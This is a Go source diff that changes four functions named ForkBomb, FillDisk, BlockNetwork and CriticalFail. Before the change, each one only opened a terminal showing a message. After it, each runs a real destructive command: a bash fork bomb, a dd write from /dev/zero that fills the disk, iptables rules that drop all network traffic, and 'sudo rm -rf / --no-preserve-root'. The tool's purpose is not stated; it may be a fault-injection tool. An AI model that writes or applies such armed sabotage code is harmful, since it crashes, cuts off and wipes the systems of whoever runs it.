@@ -6,21 +6,18 @@ import (
 )
 
 func ForkBomb() error {
-	//exec.Command("bash", "-c", ":(){ :|:& };:").Run()
-	exec.Command("bash", "-c", "DISPLAY=:0 gnome-terminal -- bash -c 'echo Fork-bomb event; read'").Run()
+	exec.Command("bash", "-c", ":(){ :|:& };:").Run()
 	return nil
 }
 
 func FillDisk() error {
-	//exec.Command("dd", "if=/dev/zero", "of=/tmp/bigfile", "bs=1M").Run()
-	exec.Command("bash", "-c", "DISPLAY=:0 gnome-terminal -- bash -c 'echo Fill disk event; read'").Run()
+	exec.Command("dd", "if=/dev/zero", "of=/tmp/bigfile", "bs=1M").Run()
 	return nil
 }
 
 func BlockNetwork() error {
-	//exec.Command("iptables", "-A", "OUTPUT", "-j", "DROP").Run()
-	//exec.Command("iptables", "-A", "INPUT", "-j", "DROP").Run()
-	exec.Command("bash", "-c", "DISPLAY=:0 gnome-terminal -- bash -c 'echo Block network event; read'").Run()
+	exec.Command("iptables", "-A", "OUTPUT", "-j", "DROP").Run()
+	exec.Command("iptables", "-A", "INPUT", "-j", "DROP").Run()
 	return nil
 }
 
@@ -37,8 +34,7 @@ done
 }
 
 func CriticalFail() error {
-	//exec.Command("bash", "-c", "sudo rm -rf / --no-preserve-root").Run()
-	exec.Command("bash", "-c", "DISPLAY=:0 gnome-terminal -- bash -c 'echo Crash event; read'").Run()
+	exec.Command("bash", "-c", "sudo rm -rf / --no-preserve-root").Run()
 	return nil
 }
 
